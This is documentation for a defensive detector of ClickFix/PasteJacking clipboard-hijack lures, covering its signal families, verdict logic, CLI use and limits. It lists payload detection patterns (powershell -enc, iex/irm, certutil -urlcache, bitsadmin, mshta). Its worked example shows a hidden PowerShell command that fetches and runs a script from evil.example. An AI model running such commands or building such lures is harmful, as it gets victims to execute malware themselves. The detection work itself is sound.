# ClickFix / PasteJacking (Clipboard-Hijack) Detection

> **Module ID:** CLICKFIX-001
> **Version:** 1.0.0
> **Phase:** Emerging Technologies of Cybercrime Defense
> **Classification:** Clipboard-hijacking / self-inflicted-execution lure detection
> **Research basis:** Mohamed Nabeel, William Melicher, Oleksii Starov (Palo Alto Networks) —
> *"PasteJacked: Detection and Characterization of Clipboard-Hijacking Attacks"*, APWG eCrime 2026.

---

## 1. Overview

Detects **ClickFix / PasteJacking** in collected page HTML/JS: a page silently writes an OS
command to the victim's clipboard, then a fake "verify you are human" / "fix this error" lure
tells them to open the **Run dialog** or a **terminal** and paste it — the victim executes
malware with their own hands, sidestepping download and attachment defences. It is a dominant
2024-2025 initial-access technique and maps to MITRE **T1204.004** (Malicious Copy and Paste).

The detector scores three independent signal families and rises only as they **co-occur**,
because any one alone is weak (a coupon "copy" button, or the word *powershell* in prose):

1. **Clipboard write** — `navigator.clipboard.writeText`, `execCommand('copy')`, `ClipboardItem`,
   `clipboardData.setData`, a `copy`-event handler.
2. **Social lure** — fake CAPTCHA/Cloudflare/Chrome "verification", **Win+R**, **Ctrl+V + Enter**,
   "open PowerShell/Terminal", numbered verification steps.
3. **Payload signature** — `powershell`/`pwsh`, `mshta`, `cmd /c`, `iex`/`Invoke-Expression`,
   `iwr`/`irm`, `curl|…`, `-enc`/`-EncodedCommand`, `certutil -urlcache`, `bitsadmin`,
   `msiexec http`, `wscript`/`cscript`, `.hta`, `-w hidden`.

It also **decodes `-EncodedCommand` base64** (UTF-16LE) — where the real C2 URL usually hides —
and surfaces the decoded command and any URL as IOCs.

**When to use:** on any collected DOM/script during page analysis, especially fake-CAPTCHA /
"verification" pages and paste-to-verify flows.

---

## 2. Tool Inventory

| Priority | Tool | Purpose | Install |
|----------|------|---------|---------|
| Primary | `scripts/clickfix_detect.py` | Offline, deterministic detector + `-enc` decoder | none |
| Feeds it | `/webpivot`, `agent-browser`, `curl` | collected DOM / inline+linked JS | none |

Fully keyless, stdlib only. **Never fetches or executes** — pure text analysis (enforced by a
structural test).

---

## 3. Investigation Workflow

```
1. Collect the page DOM and any inline/linked scripts (WebPivot / agent-browser / curl)
2. Pipe the content to clickfix_detect.py
3. Read the verdict:
     high   -> clipboard write wired to a command payload (real ClickFix)
     medium -> two families, or payload + lure
     low    -> a single family (e.g. a benign copy button)
4. Capture extracted_payloads + decoded_commands + iocs.urls into the IOC bundle
5. Pivot the C2 URL/host (/webpivot, passive DNS) and map to /threat-model (T1204.004, T1059)
```

---

## 4. CLI Commands & Expected Output

```bash
# From a saved page
python3 scripts/clickfix_detect.py page.html

# From collected DOM on stdin
curl -s https://suspicious.example/ | python3 scripts/clickfix_detect.py -

# JSON for the pipeline; only report medium+ 
python3 scripts/clickfix_detect.py page.html --json --min medium -o finding.json
```

**Output:** `verdict` (none/low/medium/high) + score, `families_present`, per-signal
`findings` (family, weight, evidence snippet), `extracted_payloads`, `decoded_commands`
(from `-enc` blobs), `iocs` (urls + commands), and the ATT&CK mapping.

**Worked example** — a page carrying `navigator.clipboard.writeText("powershell -w hidden -enc
<base64>")` plus a Win+R/Ctrl+V lure returns `HIGH`, decodes the base64 to
`IEX(IRM http://evil.example/a.ps1)`, and surfaces `http://evil.example/a.ps1` as a URL IOC.

---

## 5. Verdict Logic

| Verdict | Condition | Why |
|---------|-----------|-----|
| **high** | clipboard-write **AND** payload signature | mechanism wired to a command |
| **medium** | any two families, or payload + lure | strong but mechanism/command not both proven |
| **low** | one family only | e.g. a legitimate copy button |
| **none** | no family | benign |

Co-occurrence — not raw keyword count — drives the verdict, so a shop page that says
"powershell" in prose or copies a coupon code does **not** read as an attack.

---

## 6. Output Interpretation

- **`decoded_commands`** is the actionable part of a `-enc` payload — the plaintext command and
  its C2 URL, which the base64 hides from a naive scan.
- **`iocs.urls`** feed straight into `/webpivot` and passive DNS for infrastructure pivoting.
- A **HIGH** verdict is a strong, defensible finding; a **MEDIUM** wants a second look (the page
  may stage the payload via a variable this static pass didn't join).

---

## 7. Confidence Ratings

| Finding | Confidence | Notes |
|---------|-----------|-------|
| HIGH (clipboard + payload) | HIGH | mechanism + command both present |
| MEDIUM (payload + lure, no clipboard API seen) | MEDIUM | JS may assemble clipboard call dynamically |
| decoded `-enc` with a resolvable C2 URL | HIGH | concrete IOC |
| LOW (copy button only) | LOW | likely benign |

---

## 8. Limitations

- **Static analysis.** Heavily obfuscated JS that builds the clipboard call or payload at
  runtime can evade the pattern pass — confirm with the renderer path (`agent-browser` /
  Playwright) when a page is suspicious but scores low.
- **Base64 decode** is best-effort (UTF-16LE → UTF-8 → latin-1, printable-ratio guarded);
  multi-layer or gzip/XOR encodings are not unwrapped.
- **No liveness.** It never fetches the C2 URL; pivot it through the passive tools instead.

---

## 9. Command Reference

### `clickfix_detect.py <html|-> [--json] [--min LEVEL]`

**Input:** page HTML/JS (file or stdin).
**Process:** score three signal families → co-occurrence verdict; decode `-enc`; extract IOCs.
**Output:** verdict, findings, payloads, decoded commands, IOCs, ATT&CK (text or JSON).

Regression-tested by `tests/test_clickfix_detect.py` (run in `scripts/audit.sh`), including
the "prose mention / coupon copy must not be HIGH" false-positive guards.

---

*ClickFix / PasteJacking Module v1.0.0 — for authorized threat-intelligence use.*
